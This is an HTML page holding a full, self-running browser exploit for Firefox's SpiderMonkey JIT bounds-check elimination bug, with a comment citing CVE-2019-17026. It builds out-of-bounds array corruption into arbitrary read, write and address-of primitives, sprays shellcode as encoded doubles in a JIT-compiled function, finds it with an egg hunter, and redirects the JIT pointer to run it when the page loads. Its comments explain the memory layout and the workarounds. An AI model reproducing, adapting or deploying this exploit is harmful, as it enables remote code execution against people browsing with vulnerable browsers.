<html>
<head>
</head>
<body>
<script>

var JITIterations = 0x1000; // Number of iterations needed to trigger JIT compilation of code. 0x400+ works on FF 65, on 70 not even 0x10000 seems to work (the value in the SavedSlotsPtr exploit)
var HelperBuf = new ArrayBuffer(8);
var HelperDouble = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

/*
These three arrays wiil appear in memory sequentially in the order they are declared within the same Nursery Chunk

struct NativeObject {
	void *GroupPtr;
	void *ShapePtr;
	void *SlotsPtr;
	void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

typedef struct _ELEMENTS_METADATA {
	uint32_t Flags;
	uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
	uint32_t Capacity; // Storage allocated for the array
	uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
	// ...
} ELEMENTS_METADATA;

After garbage coillection, these appear as:

000000000B5BF100  000000000B5A5A60  <- array 1 native object
000000000B5BF108  000000000B5C21C8 
000000000B5BF110  0000000000000000  
000000000B5BF118  000000000B5BF130  <- array 1 element pointer
000000000B5BF120  0000000000000000  <- array 1 element metadata
000000000B5BF128  0000000000000006  
000000000B5BF130  FFFA800000000000  <- array 1 element data
000000000B5BF138  FFFA800000000000  
000000000B5BF140  FFFA800000000000  
000000000B5BF148  FFFA800000000000  
000000000B5BF150  FFFA800000000000  
000000000B5BF158  FFFA800000000000  
000000000B5BF160  000000000B5A5A90  <- array 2 native object
000000000B5BF168  000000000B5C21C8  
000000000B5BF170  0000000000000000  
000000000B5BF178  000000000B5BF190  
000000000B5BF180  0000007E00000000  <- Overwritten array 2 metadata (elements data)
000000000B5BF188  0000007E0000007E  
000000000B5BF190  0000000000000000  <- array 2 element data (where native object pointer actually goes)
000000000B5BF198  0000000000000000  
000000000B5BF1A0  0000000000000000  
000000000B5BF1A8  0000000000000000  
000000000B5BF1B0  0000000000000000  
000000000B5BF1B8  0000000000000000  
000000000B5BF1C0  000000000B5A5AC0  <- Start of array 3 native object
000000000B5BF1C8  000000000B5C21C8 
000000000B5BF1D0  0000000000000000  
000000000B5BF1D8  000000000B5BF1F0  
000000000B5BF1E0  0000000000000000  <- array 3 metadata
000000000B5BF1E8  0000000000000006  
000000000B5BF1F0  0000000000000000  <- Element pointer mutable array 3
000000000B5BF1F8  0000000000000000  
000000000B5BF200  0000000000000000  

There are several key indexes which line up with this layout in memory:
1. Corruption of Array 2 metadata is done with indexes 10 and 11 of Array 1 (offsets 0x50 and 0x58 from Array 1 element data): 0x000000000B5BF180 - 000000000B5BF130
2. The slot pointer of the Array 3 native object is accessed with index 8 of Array 2 (offset 0x40 from Array 2 element data): 000000000B5BF1D0 - 000000000B5BF190

The heavy dependence on double floating points in this exploit causes a variety of issues to be considered.
Primarily, that certain values (particularly those with certain of their most significant 64 bits set)
cannot be treated as doubles by JS. This leads to many limitations:
1. The shellcode being JIT sprayed must be able to be 100% encoded as valid doubles. It may need to be
   modified (such as inserting NOPs at key offsets) to accomodate this reality.
2. The initial read primitive (memory leaking doubles) cannot leak 8 byte chunks of memory which cannot
   be interpreted as doubles. In certain cases, JS may even interpret them as tagged pointers, causing
   them to be dereferenced and crashing the process.
3. Both the read/write primitives cannot target addresses which cannot be stored as doubles since these
   addresses themselves must be stored and set as doubles in this source code. Similarly the value itself
   being written in the write primitive must be able to be encoded as a valid double otherwise it could
   not be passed as a double param to the arbitrary write function.
   
The R/W quirks in this exploit lead to some interesting issues and workarounds. Certain types of objects
in JS will be stored on the heap (which is only using 32-bits of the 64 bit address space and is thus
always interpreted as a valid double) while others (such as JIT'd code) will be stored in newly allocated
+RX virtual memory, which is going to use all 64-bits of its address space. This means that objects
stored on the stack/heap are going to generally be fair game, while JIT'd/non-heap regions will be off
limits to the initial R/W primitives.



*/

////////
////////
// Debug/timer code
////////

var EnableDebug = 0;
var EnableTimers = 0;
var AlertOutput = 1;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// MIL Boundscheck elimination bug/OOB glitch logic
////////

// Note that these cannot be declared as vars
oob_arr = [1.1, 1.2, , 1.4]; // MStoreElementHole access to a global sparse array is the unique edge case which resets the prevents it from being considered a dependency of the second Array1 boundscheck (thus allowing the first and second boundscheck to be considered for congruence and the second eliminated by the MIL optimizer)
BugArray1 = new Array(0x20); // This array will be used (after heap grooming) to make the OOB overwrite of BugArray2 metadata. The heap grooming requires the .length be set to 0, but the length will not matter due to boundscheck elimination (the capacity however still will).
BugArray2 = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in MutableArray
MutableArray = new Array(0x20); // The mutable array with capacity/boundscheck constraints lifted

// Side effects
oob_arr.__defineSetter__("-1", function(x) {
	// Key to understand here is that setting these lengths to 0 and having GC manipulate them into pointing at each other could be done without the boundscheck elimination bug. The boundscheck elimination bug however is what allows them to actually access each other, as it is necessary to set .length to 0 to do the GC trick and the boundschecks are based on .length. Note that access to all of these arrays will still be limited by their capacity metadata field despite elimination of their .length boundscheck.
	BugArray1.length = 0;
	BugArray2.length = 0;
	MutableArray.length = 0;
	GC(); // The element data of each array will be freed, and each array will "fall" into the slot it left behind, thus leading to the Array1 element data pointer pointing at BugArray2 start (its metadata) and BugArray2 element data pointer pointing at MutableArray metadata,
});

// Call the GC - Phoenhex function
function GC() {
	maxMallocBytes=128*1024*1024; // 128m
	for (var i = 0; i <3; i++) {
		var x = new ArrayBuffer(maxMallocBytes); // Allocate locally, but don't save
	}
}

function jitme(index, in2, in3) {
	// Removes future bounds checks with GVN
	BugArray1[in2] = 4.2;
	BugArray1[in2 - 1] = 4.2;

	// Triggers the side-effect function
	oob_arr[index] = 2.2;

	// Write out-of-bounds. Normally boundscheck would prevent this based on .length. Note that despite the bugged elimination of this check, access is still limited to the SavedSlotsPtr capacity metadata field.
	BugArray1[in2] = in3; // capacity and length
	BugArray1[in2 - 1] = 2.673714696616e-312; // initLength and flags
}

// Tried as low as 0x400 and a bit below, and it still works. Seems magic number is between 0x100 and 0x400 (which is what is used in the Overcl0k CVE).
for(i = 0; i < JITIterations; i++) { // 0x10000 works on 65. 0x1000 also works on 65 and is what is used in the crash/Mozilla PoCs. 0x100 does not. 0x1000 seems to be the correct ammount to "JIT" the function even though maxspl0it uses 0x10000 in https://github.com/maxpl0it/CVE-2019-17026-Exploit/blob/master/calc.html
	oob_arr.length = 4; // Reset the length so that StoreElementHole node is used
	jitme(5, 11, 2.67371469724e-312);
}

oob_arr.length = 4; // Reset the length one more time
jitme(-1, 11, 2.67371469724e-312); // Call the jitted function with the side-effect index (-1)
HelperDouble[0] = BugArray2[9];
DebugLog("Leaked MutableArray elements pointer: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));

// Initialize mutable array properties for R/W/Address-of primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

////////
////////
// Arbitrary read/write/address-of primitives
////////

/*

What makes the read "weak" is that the value which is actually being read at the provided address
must be a valid double. If specific bits are set in its most significant bits, it may be invalid
as a double and may be interpreted as a tagged pointer instead, which will cause JS to dereference it
and crash the process.
*/

function LeakDouble(TargetAddress) {
	SavedSlotsPtr = BugArray2[8];
	BugArray2[8] = TargetAddress; // properties pointer - change the pointer of x
	//DebugLog("Weak read set slots pointer of Array2 native object to 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	result = MutableArray.x;
	BugArray2[8] = SavedSlotsPtr;
	return result;
}

function WriteMemDbl(TargetAddress, Val) {
	SavedSlotsPtr = BugArray2[8];
	BugArray2[8] = TargetAddress;
	MutableArray.x = Val;
	BugArray2[8] = SavedSlotsPtr;
}

function LeakObjectAddressDbl(Obj) {
	SavedSlotsPtr = BugArray2[8]; 
	MutableArray.y = Obj;

	HelperDouble[0] = BugArray2[8];
	HelperDword[0] = HelperDword[0] + 4;
	BugArray2[8] = HelperDouble[0];
	
	HelperDouble[0] = MutableArray.x;
	LeakedLow = HelperDword[1];
	
	HelperDouble[0] = MutableArray.y; // Works in release, not in debug (assertion issues)

	LeakedHigh = HelperDword[0] & 0x00007fff;

	BugArray2[8] = SavedSlotsPtr;

	HelperDword[0] = LeakedLow;
	HelperDword[1] = LeakedHigh;
	return HelperDouble[0];
}

target_buf = new Float64Array(1); // Used for the strong read
data_ptr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read


// Saves the pointer to the data pointer so it doesn't have to be recalculated
function setup_strong_read() {
	arr_addr = LeakObjectAddressDbl(target_buf);
	HelperDouble[0] = arr_addr;
	HelperDword[0] = HelperDword[0] + 56; // float64array data pointer
	data_ptr = HelperDouble[0];
}

// The strong read
//    1. Write the target address to the data pointer
//    2. Read the first double from the location
function read(TargetAddress) {
	WriteMemDbl(data_ptr, TargetAddress);
	return target_buf[0];
}

////////
////////
// JIT spray/egghunter shellcode logic
////////

function Shellcode(){
	Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
	S1 = -3.384548150597339e+269;
	S2 = -9.154525457562153e+192;
	S3 = 4.100593930228791e+42;
	S4 = -5.954547129302479e-264;
	S5 = -9.244463753049997e-33;
	S6 = 2.7270716145836e-310;
	S7 = -1.311379727091029e+181;
	S8 = 1.1053351980286266e-265;
	S9 = -6.157050177423659e-264;
	S10 = 2.719585641407824e-276;
	S11 = 9.33863949997304e-310;
	S12 = 2.1570006298724987e+267;
	S13 = 1.51645067558523e+45;
	S14 = 4.9104595322442735e+252;
	S15 = 1.0039474593959752e-89;
	S16 = 5.217422081935911e+268;
	S17 = 2.2397773113094206e+84;
	S18 = 2.9653441733280347e+40;
	S19 = -7.555905394876245e-293;
	S20 = -1.5162080322508992e+82;
	S21 = 3.909631192677548e+112;
	S22 = 1.5636948002514616e+158;
	S23 = -2.6295656969507476e-254;
	S24 = -6.001472476578534e-264;
	S25 = 9.25337251529007e-33;
	S26 = 4.419915842157561e-80;
	S27 = 8.07076629722016e+254;
	S28 = 3.736523284e-314;
	S29 = 3.742120352320771e+254;
	S30 = 1.0785207726585762e-32;
	S31 = -2.6374368557341455e-254;
	S32 = 1.2702053652464168e+145;
	S33 = -1.3113796337500435e+181;
	S34 = 1.2024564583763433e+111;
	S35 = 1.1326406542153807e+104;
	S36 = 9.646933740426927e+39;
	S37 = -2.5677414592270957e-254;
	S38 = 1.5864445474697441e+233;
	S39 = -2.6689139052065564e-251;
	S40 = 1.0555057376604044e+27;
	S41 = 8.364524068863995e+42;
	S42 = 3.382975178824556e+43;
	S43 = -8.511722322449098e+115;
	S44 = -2.2763239573787572e+271;
	S45 = -6.163839243926498e-264;
	S46 = 1.5186209005088964e+258;
	S47 = 7.253360348539147e-192;
	S48 = 1.4424067400899e-309;
	S49 = -2.4000983157210945e-284;
	S50 = -1.1554348699939644e+156;
	S51 = 1.4556863465871746e+39;
	S52 = -53025350.160568245;
	S53 = -6.592137368547996e+232;
	S54 = -5.954496632196354e-264;
	S55 = 1.0553922879130128e+27;
	S56 = -1.098771600725952e-244;
	S57 = -2.5574368247075522e-254;
	S58 = 3.618778572061404e-171;
	S59 = -1.4656824334476123e+40;
	S60 = 4.6232700581905664e+42;
	S61 = -3.6562604268727894e+125;
	S62 = 8.3411541370016e-310;
	S63 = 5.89235961469707e-306;
	S64 = 1.087942540584584e-309;
	S65 = -1.124295257309982e-244;
	S66 = 9.721361635762766e-270;
	S67 = 2.182615256525135e-82;
	S68 = 1.9115806608168328e+214;
	S69 = 6.81191715765015e+38;
	S70 = -1.3715310129144283e+305;
	S71 = -8397076621.682557;
	S72 = 5.252044005191025e-309;
	S73 = -2.70639260179825e+297;
	S74 = 6.80564913620481e+38;
	S75 = 4.46014544172855e+43;
	S76 = -1.265787460377773e-37;
	S77 = -1.773661455514501e+302;
	S78 = 6.805648324908426e+38;
	S79 = -6.280309711216237e-261;
	S80 = -1.5959006450266017e+211;
	S81 = -2.049784425552384e+303;
	S82 = 2.5190632058882454e+151;
	S83 = -6.039552836032778e-264;
	S84 = 5.808192539620053e+250;
	S85 = -2.6834714383866406e-48;
	S86 = -1.365491462675685e+305;
	S87 = -1.3660571134571838e+305;
	S88 = -3.5855233691660036e+16;
}

function EggHunter(Address) {
	HelperDouble[0] = Address;

	for(i = 0; i < 1000; i++) { // Only search 100 qwords
		val = read(HelperDouble[0]); // Strong read primitive
		if(val == 5.40900888e-315) {
			DebugLog("[+] Shellcode offset at 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
			HelperDword[0] = HelperDword[0] + 8; // Past the find_me value
			return HelperDouble[0];
		}
		HelperDword[0] = HelperDword[0] + 8;
	}
	
	return 0.0;
}

////////
////////
// Primary high level exploit logic
////////

function Exploit() {
	// JIT compile the shellcode and leak its JIT compilation address (this will be within a +RX region of virtual memory)
	
	for(i = 0; i < JITIterations; i++) Shellcode(); // JIT spray the shellcode
	ShellcodeFuncObjAddress = LeakObjectAddressDbl(Shellcode);
	HelperDouble[0] = ShellcodeFuncObjAddress; // The JSFunction object address associated with the (now JIT compiled) shellcode data.
	HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
	DebugLog("ShellcodeFuncObjAddress pointer: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	ShellcodeJSFuncObjAddress = HelperDouble[0];
	JITInfoAddress = LeakDouble(HelperDouble[0]); // In the event that the first LeakDouble after the first LeakObjectAddressDbl fails, MutableArray.x will not change from its initialized value of 0x41414141 (this is its value AFTER the +4 shift that occurs in the weak_addrod)
	HelperDouble[0] = JITInfoAddress;
	
	if(HelperDword[0] == 0x41414141) { // Verify that MutableArray.x was not its initialized value during the last arbitrary read. This would only be the case if the slots ptr has NEVER been successfully overwritten post-addrof primitive (the address we attempted to read was not a valid double).
		HelperDouble[0] = ShellcodeJSFuncObjAddress;
		DebugLog("Arbitrary read primitive failed on address 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
		//window.location.reload();
	}
	else {
		ShellcodeFuncJITAddress = LeakDouble(JITInfoAddress);
		HelperDouble[0] = ShellcodeFuncJITAddress;
		DebugLog("[+] JIT is at 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));

		// Get strong read primitive
		setup_strong_read();

		// For this we need the strong read primitive since values here can start with 0xffff and thus act as tags
		ShellcodeAddress = EggHunter(ShellcodeFuncJITAddress);

		if(ShellcodeAddress) {
			// Write the new JIT function address
			WriteMemDbl(JITInfoAddress, ShellcodeAddress);

			// Trigger code exec
			Shellcode();
		}
	}
}

Exploit()
</script>
</body>
</html>
